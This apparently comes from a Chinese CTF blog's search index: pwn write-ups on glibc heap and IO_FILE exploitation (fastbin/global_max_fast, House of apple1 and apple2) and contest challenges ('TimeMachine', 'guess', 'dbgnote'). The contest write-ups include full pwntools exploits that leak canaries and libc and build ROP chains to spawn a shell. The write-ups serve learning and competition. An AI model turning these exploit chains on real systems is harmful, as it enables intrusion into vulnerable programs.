其会导致tcache的结构体的entry指针数组无法容纳下足够多的链表头指针 fastbin也有自己的用来管理链表头的数组 我们称之为fastbinY 其位于main_arena上 如果我们通过修改global_max_fast 从而把一个大chunk释放到了fastbin中 那么其指针就会超过fastbinY的范围 从而延申到高地址处 那么我们也就相当于可以往fastbinY高地址处任意写一个堆地址 利用首先我们想办法将global_max_fast的值修改为一个极大值 这里我选择的办法是largebin attack 随后我们计算一下fastbinY和我们想要写入堆地址的偏移 如上图 这个时候和_IO_list_all偏移为0xa10 那么我们最后只需要申请一个 0x10+0xa10*2的chunk 并且将其释放 那么其指针就会被放入_IO_list_all 这一点可以延申出什么利用效果呢 如果题目存在UAF漏洞 那么我们就可以泄露fastbinY后的内存空间上的任意数据 比如此时我想要泄露main_arena+784处的内容 那么我就需要申请一个 2*（784-16）+0x10 也就是0x610的chunk 此时再次释放后 由于链表的并入机制 此时的chunk地址就会填入main_arena+784 而其原本的内容 就会被充当chunk的fd域 同理 如果我们修改已经被释放chunk的fd域 随后再次申请该chunk出来 此时的fd域就会被充当链表头 那么就相当于了一次任意写 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"House of apple2","slug":"House-of-apple2","date":"2023-07-16T07:57:37.000Z","updated":"2023-09-14T17:19:20.000Z","comments":true,"path":"2023/07/16/House-of-apple2/","link":"","permalink":"http://example.com/2023/07/16/House-of-apple2/","excerpt":"","text":"前言虽然是名为house of apple2 但是和apple1的利用没有太大的关系 当成一条全新的链就行了 只需要一次largebin就可以实现的链 适用于2.35这样的高版本 触发条件为exit或者abort 需要调用到io结构体的vtable的overflow函数 链路分析触发的方式和apple1是一样的 可以通过显示调用的exit 或者是从main函数返回的隐式exit 或者是malloc_assert输出报错信息 下面是通过exit触发的链 exit -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW 主要的思想就是劫持IO_list_all为堆地址 从而我们可以伪造io结构体 这里主要注意的就是两个成员 一个是_wide_data 一个是vtable 我们先说vtable 这里的思路是将其伪造为_IO_wfile_jumps 这样触发io时会调用到_IO_wfile_overflow 来看一下这个函数主要的内容 其内部调用了wdoallocbuf函数 这个函数存在一个任意函数调用的点 其索引是通过rax寄存器来的 而此时的rax值 就是fakeio的0xa0偏移处的wide_data成员 其wide_data处要求是一个结构体指针 wdoallocbuf函数会调用该指针的vtable的overflow函数 如果我们将其控制为setcontext 就可以实现一段rop 哪怕是开启了沙盒 也是适用的 伪造分析关键的伪造点就那几个 1.先要把_IO_list_all利用largebin attack先覆盖成可控地址 用来伪造结构体 下面称fakeio1 2.控制fakeio1的vtable为_IO_wfile_jumps 从而调用到 _IO_wfile_overflow 3.控制fakeio1的_wide_date为fakeio2 4.控制fakeio2的vtable为fakeio3 5.控制fakeio3的偏移0x68处为setcontext 需要注意的就是最后的rop链存放的位置不能影响到fakeio的其他成员 导致程序执行流无法顺利执行 还有就是之所以 不直接更改_wide_data-&gt;vtable-&gt;0x68为system函数 然后设置fakeio首地址处为&#x2F;bin&#x2F;sh 这样破坏了flag成员 无法让程序执行流按预期的执行 剩下的就参考下面的模板吧 fakeio1IO_wfile_jumps = libc_addr + 0x2160c0fake_file = b&#x27;&#x27;fake_file = fake_file.ljust(0x20,b&#x27;\\x00&#x27;)+p64(0)+p64(1)fake_file = fake_file.ljust(0xa0,b&#x27;\\x00&#x27;)+p64(chunk5_addr)fake_file = fake_file.ljust(0xd8,b&#x27;\\x00&#x27;)+p64(IO_wfile_jumps)payload = cyclic(0x10)+fake_file fakeio2payload = b&#x27;&#x27;payload = payload.ljust(0x58,b&#x27;\\x00&#x27;)+p64(setcontext)payload = payload.ljust(0x90,b&#x27;\\x00&#x27;)+p64(chunk5_addr+0xf0)+p64(ret_addr)payload = payload.ljust(0xd0,b&#x27;\\x00&#x27;)+p64(chunk5_addr)+p64(0)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr) if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"House of apple1","slug":"House-of-apple1","date":"2023-07-07T14:29:06.000Z","updated":"2023-09-14T17:19:18.000Z","comments":true,"path":"2023/07/07/House-of-apple1/","link":"","permalink":"http://example.com/2023/07/07/House-of-apple1/","excerpt":"","text":"前言2.35很好用的一条链 十分推荐学习 仍然建议是自己看完分析以后 然后动调学着伪造结构体 毕竟ctf的pwn学习主要还是培养思维 利用链分析通过劫持io_list_all 利用exit函数触发overflow 可以达到任意地址写已知地址的功能 完整的利用链如下 exit -&gt; fcloseall -&gt; _IO_cleanup -&gt; _IO_flush_all_lockp -&gt; _IO_OVERFLOW 而我们只需要利用largebinattack往IO_list_all中写入一个堆地址 随后在该chunk上构造结构体 首先要明白一点 exit函数的执行 会通过IO_list_all来索引所有的iofile 并且通过其vtable来索引到对应的overflow函数 那么来看一下IO_wstrn_jumps的overflow函数 static wint_t_IO_wstrn_overflow (FILE *fp, wint_t c)&#123; /* When we come to here this means the user supplied buffer is filled. But since we must return the number of characters which would have been written in total we must provide a buffer for further use. We can do this by writing on and on in the overflow buffer in the _IO_wstrnfile structure. */ _IO_wstrnfile *snf = (_IO_wstrnfile *) fp; if (fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf) &#123; _IO_wsetb (fp, snf-&gt;overflow_buf, snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf) / sizeof (wchar_t)), 0); fp-&gt;_wide_data-&gt;_IO_write_base = snf-&gt;overflow_buf; fp-&gt;_wide_data-&gt;_IO_read_base = snf-&gt;overflow_buf; fp-&gt;_wide_data-&gt;_IO_read_ptr = snf-&gt;overflow_buf; fp-&gt;_wide_data-&gt;_IO_read_end = (snf-&gt;overflow_buf + (sizeof (snf-&gt;overflow_buf) / sizeof (wchar_t))); &#125; fp-&gt;_wide_data-&gt;_IO_write_ptr = snf-&gt;overflow_buf; fp-&gt;_wide_data-&gt;_IO_write_end = snf-&gt;overflow_buf; /* Since we are not really interested in storing the characters which do not fit in the buffer we simply ignore it. */ return c;&#125; 在最开始 进行了一个指针类型的转化 但是snf和fp还是指向同一个iofile 也就是我们的chunk 接着如果通过了这个判断 就可以进入if分支 fp-&gt;_wide_data-&gt;_IO_buf_base != snf-&gt;overflow_buf 这里的overflow_buf是什么呢 我们来看一下_IO_wstrnfile涉及到的结构体 struct _IO_str_fields&#123; _IO_alloc_type _allocate_buffer_unused; _IO_free_type _free_buffer_unused;&#125;; struct _IO_streambuf&#123; FILE _f; const struct _IO_jump_t *vtable;&#125;; typedef struct _IO_strfile_&#123; struct _IO_streambuf _sbf; struct _IO_str_fields _s;&#125; _IO_strfile; typedef struct&#123; _IO_strfile f; /* This is used for the characters which do not fit in the buffer provided by the user. */ char overflow_buf[64];&#125; _IO_strnfile; typedef struct&#123; _IO_strfile f; /* This is used for the characters which do not fit in the buffer provided by the user. */ wchar_t overflow_buf[64]; // overflow_buf在这里********&#125; _IO_wstrnfile; 可以看到最后一个结构体中定义了overflow_buf的数组变量 大部分情况下 这个判断是可以通过的 目前还没有遇到过不通过的情况 遇到了再做补充 进入if分支以后 可以看到我们对于fp-&gt;_wide_data存储的成员变量赋值了很多次 赋的值我们在随后的伪造过程中可以清晰的看到 是fakefile_addr + 0xf0 或者是+0x1f0 这里先记住一下 随后再深入研究 为了实现上述的任意地址写已知值 我们需要控制一下fakefile的_wide_data成员 并且还需要使得vtable为IO_wstrn_jumps 这样就可以往 _wide_data处的指针写入fake_file+0xf0和fake_file+0x1f0 通过下面iofile的成员偏移 可以得知我们需要往fakefile的0xa0写入一个地址 往0xd8写入IO_wstrn_jumps 同时伪造好相关的成员 使得我们能够执行到IO_wstrn_overflow函数 amd64： 0x0:&#x27;_flags&#x27;,0x8:&#x27;_IO_read_ptr&#x27;,0x10:&#x27;_IO_read_end&#x27;,0x18:&#x27;_IO_read_base&#x27;,0x20:&#x27;_IO_write_base&#x27;,0x28:&#x27;_IO_write_ptr&#x27;,0x30:&#x27;_IO_write_end&#x27;,0x38:&#x27;_IO_buf_base&#x27;,0x40:&#x27;_IO_buf_end&#x27;,0x48:&#x27;_IO_save_base&#x27;,0x50:&#x27;_IO_backup_base&#x27;,0x58:&#x27;_IO_save_end&#x27;,0x60:&#x27;_markers&#x27;,0x68:&#x27;_chain&#x27;,0x70:&#x27;_fileno&#x27;,0x74:&#x27;_flags2&#x27;,0x78:&#x27;_old_offset&#x27;,0x80:&#x27;_cur_column&#x27;,0x82:&#x27;_vtable_offset&#x27;,0x83:&#x27;_shortbuf&#x27;,0x88:&#x27;_lock&#x27;,0x90:&#x27;_offset&#x27;,0x98:&#x27;_codecvt&#x27;,0xa0:&#x27;_wide_data&#x27;,0xa8:&#x27;_freeres_list&#x27;,0xb0:&#x27;_freeres_buf&#x27;,0xb8:&#x27;__pad5&#x27;,0xc0:&#x27;_mode&#x27;,0xc4:&#x27;_unused2&#x27;,0xd8:&#x27;vtable&#x27; 伪造分析前面利用largebin往IO_list_all写堆地址的部分就不讲了 我们先大致伪造一下fakefile 随后断点打在 _IO_flush_all_lockp 观察如何满足条件 使其执行到IO_wstrn_overflow函数 fake_file = b&#x27;&#x27;fake_file = fake_file.ljust(0xa0,b&#x27;\\x00&#x27;)+p64(heap_addr)fake_file = fake_file.ljust(0xd8,b&#x27;\\x00&#x27;)+p64(IO_wstrn_jumps) 通过简单的观察汇编 我们不难发现我们需要使得程序执行到_IO_flush_all_lockp+223处才可以进入overflow函数 接下来逐步n下去 观察到这里的判断 如果不使其跳转 那么我们就跳过了223处的调用 观察一下此时r15寄存器参数 这里需要使得r15+0x28处小于r15+0x20处 而此时r15寄存器存储的就是我们fake_file 所以我们在对应地址布置好参数 此时再次动调 发现成功进入overflow函数 fake_file = b&#x27;&#x27;fake_file = fake_file.ljust(0x20,b&#x27;\\x00&#x27;)+p64(0)+p64(1)fake_file = fake_file.ljust(0xa0,b&#x27;\\x00&#x27;)+p64(heap_addr)fake_file = fake_file.ljust(0xd8,b&#x27;\\x00&#x27;)+p64(IO_wstrn_jumps) 同时你可以看到这个函数 其赋值就是通过那一堆movdpa指令 其参数时xmm0 向上溯源一下会发现就是rdi+0xf0和rdi+0x1f0两种 此时观察我们想要写入已知值的堆基址 可以发现写入成功 注意事项需要注意的是 在_IO_wstrn_overflow+78处 你会发现其执行了IO_wsetb函数 阅读其源码 我们会发现其内部调用了free函数 void_IO_wsetb (FILE *f, wchar_t *b, wchar_t *eb, int a)&#123; if (f-&gt;_wide_data-&gt;_IO_buf_base &amp;&amp; !(f-&gt;_flags2 &amp; _IO_FLAGS2_USER_WBUF)) free (f-&gt;_wide_data-&gt;_IO_buf_base); // 其不为0的时候不要执行到这里 f-&gt;_wide_data-&gt;_IO_buf_base = b; f-&gt;_wide_data-&gt;_IO_buf_end = eb; if (a) f-&gt;_flags2 &amp;= ~_IO_FLAGS2_USER_WBUF; else f-&gt;_flags2 |= _IO_FLAGS2_USER_WBUF;&#125; 这里的rdx值就是我们想要任意写已知值的地址 如果其+0x30处 不为0 那么就不会跳转 从而触发执行free函数 这里有时候需要注意一下 不过如果地址无法满足判断条件的话 这里还有一次更改fakefile参数来避免的办法 rbx寄存器的值就是我们fakefile的地址 使其0x74处的数据赋值给了eax 同时对于al寄存器和8进行test 如果其不为8的话 就可以绕过 (不乱改数据的话 我觉得很少的情况才会遇到吧 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"}],"tags":[]},{"title":"2023天融信杯车联网比赛初赛","slug":"2023天融信杯车联网比赛初赛","date":"2023-07-03T12:40:22.000Z","updated":"2023-09-14T17:21:26.000Z","comments":true,"path":"2023/07/03/2023天融信杯车联网比赛初赛/","link":"","permalink":"http://example.com/2023/07/03/2023%E5%A4%A9%E8%9E%8D%E4%BF%A1%E6%9D%AF%E8%BD%A6%E8%81%94%E7%BD%91%E6%AF%94%E8%B5%9B%E5%88%9D%E8%B5%9B/","excerpt":"","text":"这次的比赛总共有三题pwn 两题出的比较新 一题就是考烂的伪随机数 这里就不收纳进入wp了 TimeMachine int __cdecl main(int argc, const char **argv, const char **envp)&#123; void *v3; // rsp _QWORD *v4; // rbx __int64 v6; // [rsp+8h] [rbp-38h] BYREF unsigned __int8 i; // [rsp+16h] [rbp-2Ah] unsigned __int8 v8; // [rsp+17h] [rbp-29h] double v9; // [rsp+18h] [rbp-28h] unsigned __int64 v10; // [rsp+20h] [rbp-20h] unsigned __int64 v11; // [rsp+28h] [rbp-18h] v11 = __readfsqword(0x28u); v9 = 31137.31337; ask_name(argc, argv, envp); v8 = ask_number(); v3 = alloca(16 * ((8 * v8 + 30) / 0x10)); v10 = 16 * ((&amp;v6 + 7) &gt;&gt; 4); for ( i = 0; i &lt; v8; ++i ) *(8LL * i + v10) = 0x40DE68540E410B63LL; for ( i = 0; ; ++i ) &#123; printf(&quot;-=-=-=-= CHALLENGE %03d =-=-=-=-\\n&quot;, i + 1); v4 = (8LL * i + v10); play_game(); *v4 = 0x40DE68540E410B63LL; if ( i &gt;= v8 - 1 || !ask_again() ) break; &#125; for ( i = 0; i &lt; v8; ++i ) &#123; if ( v9 &gt; *(8LL * i + v10) ) v9 = *(8LL * i + v10); &#125; puts(&quot;-=-=-=-= RESULT =-=-=-=-&quot;); printf(&quot;Name: %s\\n&quot;, name); HIBYTE(v6) = HIBYTE(v9); printf(&quot;Best Score: %lf\\n&quot;, v9); return 0;&#125; 主要的逻辑就是利用gettimeofday来实现一个控制时间的小游戏 输入想要间隔的时间 然后两次输入任意字符来开启和终止计时 不过程序本身并没有漏洞 漏洞主要出现在完成一次游戏后 是否还要继续的函数 _BOOL8 ask_again()&#123; char v1[24]; // [rsp+0h] [rbp-20h] BYREF unsigned __int64 v2; // [rsp+18h] [rbp-8h] v2 = __readfsqword(0x28u); printf(&quot;Play again? (Y/n) &quot;); __isoc99_scanf(&quot;%s&quot;, v1); readuntil(10LL); return v1[0] != 110 &amp;&amp; v1[0] != 78;&#125; 这里存在了一个栈溢出漏洞 但是由于程序本身开启了canary 所以我们需要想办法获取canary的值 这里当然是特别关注一下程序的几个输出函数 看看有没有机会泄露 发现了这个printf函数的调用存在可疑点 其将rbp-0x48处的内容赋值给了rbp-0x58 我们通过gdb动调来查看一下 可以看到相当于就是把canary赋值给了rsp指针指向的下一个字长处 这样的用意何在呢 可以看到随后就被赋值给了xmm0浮点数寄存器 这是printf函数利用%lf格式化字符输出数据的固定调用格式 会把调用时rsp的下一个字长内容输出 只要我们在ask_time函数中输入的v4不符合指定格式 那么v4就不会被赋值 从而我们可以泄露出canary 在后续的栈溢出中构造rop链 同时还有一点要注意的 由于是scanf引起的栈溢出 所以\\x20 也就是空格 是无法被读入的 而本题的got表都位于0x602000处 所以我们需要泄露libc_start_main的基址 完整exp: from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;123.127.164.29&quot;,27917)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.binary = elfcontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]#libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)libc = ELF(&quot;./libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;x&#x27;)io.recvuntil(&quot;&gt; &quot;)io.sendline(b&#x27;16&#x27;)io.recvuntil(&quot;Time[sec]: &quot;)# gdb.attach(io,&#x27;b *0x40099F&#x27;)# pause(0)io.sendline(b&#x27;c&#x27;)# pause()io.recvuntil(&quot;Stop the timer as close to &quot;)t = io.recvuntil(&quot; &quot;,drop = True)canary = struct.pack(&quot;&lt;d&quot;, float(t))io.recvuntil(&quot;Press ENTER to start / stop the timer.&quot;)io.send(&#x27;\\n&#x27;)io.recvuntil(&quot;Timer started.&quot;)io.send(&#x27;\\n&#x27;)io.recvuntil(&quot;Play again? (Y/n) &quot;)puts_plt = elf.sym[&#x27;puts&#x27;]libc_start_main_got = 0x601ff0rdi_addr = 0x0000000000400e93ret_addr = 0x00000000004006a6back_addr = 0x40089Brop = ROP(elf)rop.puts(elf.got.__libc_start_main)rop.ask_again()payload = cyclic(0x18)+canary+cyclic(0x8)+p64(rdi_addr)+p64(libc_start_main_got)+p64(puts_plt)+p64(back_addr)# gdb.attach(io,&#x27;b *0x400916&#x27;)# pause(0)io.sendline(payload)# pause()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-0x23fc0success(&quot;libc_addr :&quot;+hex(libc_addr))io.recvuntil(&quot;Play again? (Y/n) &quot;)system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))success(&quot;system_addr :&quot;+hex(system_addr))payload = cyclic(0x18)+canary+cyclic(0x8)+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)# gdb.attach(io,&#x27;b *0x4008DB&#x27;)# pause(0)io.sendline(payload)# pause()io.interactive() guess这题的漏洞点和上题类似 不过考到了pthread_join线程函数带来的漏洞 __int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123; unsigned __int64 v3; // rax void *v4; // rsp int i; // [rsp+8h] [rbp-20h] BYREF int v7; // [rsp+Ch] [rbp-1Ch] pthread_t newthread[3]; // [rsp+10h] [rbp-18h] BYREF newthread[2] = __readfsqword(0x28u); sub_13E8(); v7 = sub_1594(); v3 = 16 * ((8LL * v7 + 23) / 0x10uLL); while ( &amp;i != (&amp;i - (v3 &amp; 0xFFFFFFFFFFFFF000LL)) ) ; v4 = alloca(v3 &amp; 0xFFF); if ( (v3 &amp; 0xFFF) != 0 ) *(&amp;i + (v3 &amp; 0xFFF) - 8) = *(&amp;i + (v3 &amp; 0xFFF) - 8); newthread[1] = 16 * ((newthread + 7) &gt;&gt; 4); sub_1552(a1); for ( i = 0; i &lt; dword_4030; ++i ) sub_1485(); fflush(stdout); puts(&quot;I don&#x27;t think you won the game if you made it until here ...&quot;); puts(&quot;But maybe a threaded win can help?&quot;); pthread_create(newthread, 0LL, start_routine, 0LL); pthread_join(newthread[0], 0LL); return 0LL;&#125; 主要的逻辑都差不多 关键在于sub_1485这个函数 if ( dword_4030 - 1 == dword_402C ) &#123; puts(&quot;Sorry, that was the last guess!&quot;); printf(&quot;You entered %lu but the right number was %lu\\n&quot;, v1, v2); &#125; 如果这是我们最后一次猜数字并且还猜错了 那么就会告诉我们正确的数字 注意了是用%lu输出的 来看一下汇编 会将rbp-0x18处的数据赋值给rsi寄存器 我们通过gdb动调来观察一下 如果我们不按要求输出数据 使得我们输入的数据为空 此时的rsi寄存器会被赋值成什么 可以泄露elf的地址 由于开启了PIE 我们在不泄露libc地址的情况下很难构造rop链 这下子就可以构造了 接着我们来说说pthread_create这个线程函数 其无非就是创建了一个新的线程 并且指定了新的线程从start_routine函数开始 随后利用pthread_join函数 指定了在原本的线程结束后 开始执行新的线程 在这里你可以注意到 两个函数的第一个参数newthread 是用来规定新线程的内存单元 也就是说新线程的内存空间是旧线程的栈 而栈地址我们知道是由高地址到低地址的 TLS结构体的初始化 就会在高地址处 而start_routine函数提供了栈溢出的机会 那么我们就有机会溢出到tls结构体 由此里绕过canary 再加上我们前面泄露了elf的基址 接下来就是ret2libc的问题了 旧线程的栈地址: 新线程的栈地址 以及tls结构体存放的位置 完整exp： from pwn import*from ctypes import *io = process(&quot;./pwn&quot;)#io = remote(&quot;123.127.164.29&quot;,27917)elf = ELF(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;libc = ELF(&quot;./glibc-all-in-one/libs/2.31-0ubuntu9.9_amd64/libc-2.31.so&quot;)#libc = cdll.LoadLibrary(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)def debug(): gdb.attach(io) pause()io.recvuntil(&quot;Enter the size : &quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Enter the number of tries : &quot;)io.sendline(b&#x27;1&#x27;)io.recvuntil(&quot;Enter your guess : &quot;)# gdb.attach(io,&#x27;b *$rebase(0x1507)&#x27;)# pause(0)# gdb.attach(io,&#x27;b *$rebase(0x16E0)&#x27;)# pause(0)io.sendline(b&#x27;c&#x27;)# pause()io.recvuntil(&quot;You entered &quot;)elf_addr = int(io.recvuntil(&quot; &quot;,drop = True),10)-0x1579success(&quot;elf_addr :&quot;+hex(elf_addr))io.recvuntil(&quot;But maybe a threaded win can help?&quot;)puts_got = elf_addr + elf.got[&#x27;puts&#x27;]puts_plt = elf_addr + elf.sym[&#x27;puts&#x27;]rdi_addr = elf_addr+0x0000000000001793back_addr = elf_addr + 0x1436ret_addr = elf_addr + 0x000000000000101apayload = cyclic(0x18)+p64(0x100)+cyclic(0x8)+p64(rdi_addr)+p64(puts_got)+p64(puts_plt)+p64(back_addr)payload = payload.ljust(0x858,b&#x27;\\x00&#x27;)+p64(0x100)io.sendline(payload)# pause()libc_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))-libc.sym[&#x27;puts&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&quot;/bin/sh&quot;))read_addr = libc_addr + libc.sym[&#x27;read&#x27;]rax_addr = libc_addr + next(libc.search(asm(&quot;pop rax;ret&quot;)))rsi_addr = libc_addr + next(libc.search(asm(&quot;pop rsi;ret&quot;)))syscall_addr = read_addr + 0x10io.recvuntil(&quot;&gt; &quot;)payload = cyclic(0x18)+p64(0x100)+cyclic(0x8)+p64(rax_addr)+p64(59)+p64(rdi_addr)+p64(binsh_addr)+p64(rsi_addr)+p64(0)+p64(syscall_addr)# gdb.attach(io,&#x27;b *$rebase(0x1484)&#x27;)# pause(0)io.sendline(payload)# pause()io.interactive() if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"2023Ciscn-dgbnote详解","slug":"2023Ciscn-dgbnote详解","date":"2023-06-26T04:32:38.000Z","updated":"2023-09-14T17:17:32.000Z","comments":true,"path":"2023/06/26/2023Ciscn-dgbnote详解/","link":"","permalink":"http://example.com/2023/06/26/2023Ciscn-dgbnote%E8%AF%A6%E8%A7%A3/","excerpt":"","text":"2023Ciscn华东南分区赛遇到的一题 觉得题目的考点非常新颖和有趣 所以打算仔细研究一下 signal题目用到了singal函数 该函数可以捕捉对应的信号 并且调用指定的信号处理函数 来看一下题目中所涉及到的两个single函数 signal(6, handler);signal(14, my_exit); 第一个参数代表的是产生的信号 这里的6是SIGABRT 当进程非正常终止 调用abort函数的时候会触发 14是SIGALRM 如果程序设置的alarm函数超时 就会触发 下面是截取网上的大部分信号表格及其描述 Signal Description SIGABRT 由调用abort函数产生，进程非正常退出 SIGALRM 用alarm函数设置的timer超时或setitimer函数设置的interval timer超时 SIGBUS 某种特定的硬件异常，通常由内存访问引起 SIGCANCEL 由Solaris Thread Library内部使用，通常不会使用 SIGCHLD 进程Terminate或Stop的时候，SIGCHLD会发送给它的父进程。缺省情况下该Signal会被忽略 SIGCONT 当被stop的进程恢复运行的时候，自动发送 SIGEMT 和实现相关的硬件异常 SIGFPE 数学相关的异常，如被0除，浮点溢出，等等 SIGFREEZE Solaris专用，Hiberate或者Suspended时候发送 SIGHUP 发送给具有Terminal的Controlling Process，当terminal被disconnect时候发送 SIGILL 非法指令异常 SIGINFO BSD signal。由Status Key产生，通常是CTRL+T。发送给所有Foreground Group的进程 SIGINT 由Interrupt Key产生，通常是CTRL+C或者DELETE。发送给所有ForeGround Group的进程 SIGIO 异步IO事件 SIGIOT 实现相关的硬件异常，一般对应SIGABRT SIGKILL 无法处理和忽略。中止某个进程 SIGLWP 由Solaris Thread Libray内部使用 SIGPIPE 在reader中止之后写Pipe的时候发送 SIGPOLL 当某个事件发送给Pollable Device的时候发送 SIGPROF Setitimer指定的Profiling Interval Timer所产生 SIGPWR 和系统相关。和UPS相关。 SIGQUIT 输入Quit Key的时候（CTRL+\\）发送给所有Foreground Group的进程 SIGSEGV 非法内存访问 SIGSTKFLT Linux专用，数学协处理器的栈异常 SIGSTOP 中止进程。无法处理和忽略。 SIGSYS 非法系统调用 SIGTERM 请求中止进程，kill命令缺省发送 SIGTHAW Solaris专用，从Suspend恢复时候发送 SIGTRAP 实现相关的硬件异常。一般是调试异常 SIGTSTP Suspend Key，一般是Ctrl+Z。发送给所有Foreground Group的进程 SIGTTIN 当Background Group的进程尝试读取Terminal的时候发送 SIGTTOU 当Background Group的进程尝试写Terminal的时候发送 SIGURG 当out-of-band data接收的时候可能发送 SIGUSR1 用户自定义signal 1 SIGUSR2 用户自定义signal 2 SIGVTALRM setitimer函数设置的Virtual Interval Timer超时的时候 SIGWAITING Solaris Thread Library内部实现专用 SIGWINCH 当Terminal的窗口大小改变的时候，发送给Foreground Group的所有进程 SIGXCPU 当CPU时间限制超时的时候 SIGXFSZ 进程超过文件大小限制 SIGXRES Solaris专用，进程超过资源限制的时候发送 readlink该函数用于获取当前程序的绝对路径 其一共有三个参数 第一个参数代表一个符号链接 第二个参数代表要存储的空间 第三个参数代表多少字节 而&#x2F;proc&#x2F;self&#x2F;exe指向当前程序的绝对路径 所以原题中的 readlink(&quot;/proc/self/exe&quot;, v2, 0x4FuLL); 就相当于获取当前程序的绝对路径 并且存储到v2内存空间中 execve配合上面我们得到v2中存储的是当前程序的绝对路径 题目中的这一行 相当于就是重新运行了程序 execve(v2, *&amp;buf[56], *&amp;buf[48]); 第二个和第三个参数用来规定新线程中的argv和envp参数 argv简单来说 argv就是传入main函数的参数数组 其中argv[0]是程序名 本题中main函数一开就对argv的参数做了检测 v4 = a2[1]; if ( !strcmp(v4, &quot;dbg&quot;) ) sub_1B70(); if ( strcmp(v4, &quot;run&quot;) ) &#123;LABEL_2: puts(&quot;Error.&quot;); exit(0); &#125; 如果为dbg 那么就可以进入sub_1b70函数 这个函数中存在任意写的机会 而如果程序的argv[1]参数不是run 就会终止程序 在远程环境中 默认就是以run为参数运行的程序 在我们本地复现的时候 需要注意手动加上参数 io = process([&quot;./pwn&quot;,&#x27;run&#x27;]) envpenvp是main函数的第三个参数 用来存储环境变量的指针 而有这样一个环境变量 LD_DEBUG&#x3D;all 其原本是用来查看链接库的情况 从而诊断报错 但是其在输出一系列信息的同时 会顺带输出libc地址 解题思路到此为之 题目的核心考点其实比较明了了 就是利用信号14的handler函数来重新启动程序 并且我们可以控制argv的参数 使其为dbg 我们就可以进入漏洞函数 为了实现这一点 我们需要触发abort 而本题开启了canary 并且在输入index或者是size时 存在了单字节的溢出 可以覆盖到canary的最后一个字节 那么当check触发时 调用__stack_chk_fail函数时 其内部会通过libc_message函数来输出报错信息 其中就会调用到abort函数 但是还有一个问题我们没有办法解决 虽然dgb函数中给了我们任意地址读和任意地址写的功能 但是开启了PIE保护的情况下 我们要如何获取libc地址来构造rop链呢 就是利用将程序的环境变量指针替换为指向LD_DEBUG&#x3D;all字符串的指针 从而泄露libc 你可以注意到 在我们输入username后的下一个输入点 存在2字节的溢出 而后面的内容正好是envp环境变量 同时你可以发现sub_14b0函数 可以泄露出栈地址的后两个字节 而我们如果在一开始的username中输入LD_DEBUG&#x3D;all字符串 那么此时就可以在对应的偏移中看到指向该字符串的指针 配合该偏移 我们可以在后续的溢出中将环境变量的指针替换成指向LD_DEBUG&#x3D;all字符串 从而在程序重新运行的时候输出libc基址 exit调用链void __noreturn sub_1B70()&#123; char *s[9]; // [rsp+0h] [rbp+0h] BYREF s[1] = __readfsqword(0x28u); puts(&quot;Please don&#x27;t patch this normal function, we will check it!&quot;); puts(&quot;[+] Debug the note.&quot;); s[0] = 0LL; __printf_chk(1LL, &quot;[Addr] &quot;); read(0, s, 8uLL); __printf_chk(1LL, &quot;[Read] &quot;); puts(s[0]); __printf_chk(1LL, &quot;[Addr] &quot;); read(0, s, 8uLL); __printf_chk(1LL, &quot;[Write] &quot;); read(0, s[0], 0x90uLL); exit(0);&#125; 可以看到dbg函数虽然给了任意地址读和任意地址写 看起来好像我们可以往栈上写入rop链 随后劫持程序执行流 但是实际不会执行到leave和ret来结束栈帧 就会触发exit 所以我们这里只能通过布局tls结构体来控制exit函数 2.35以上的版本 exit函数内部调用了__run_exit_handlers函数 而该函数内部又调用了一个关键的函数 可以供我们实现任意函数调用 下面跟着我来分析一下如何构造tls结构体 以此来实现system函数调用 这里的rbx的值通常是不会变化的 其取决于rip索引 我们这里需要使得je跳转失败 从而才能进入任意函数调用的部分 这里的rbp取值是根据tls结构体低地址处 我们计算好偏移以后 利用dgb函数的任意写机会将其修改不为0后即可不跳转 这部分的内容是新版本加入的指针保护机制 通过循环右移11位后和tls结构体中的key异或后解密指针 当然我们拥有tls结构体任意写的权限话 很容易就能绕过 我们只需要使得rax一开始为0 设置fs:0x30处为system函数 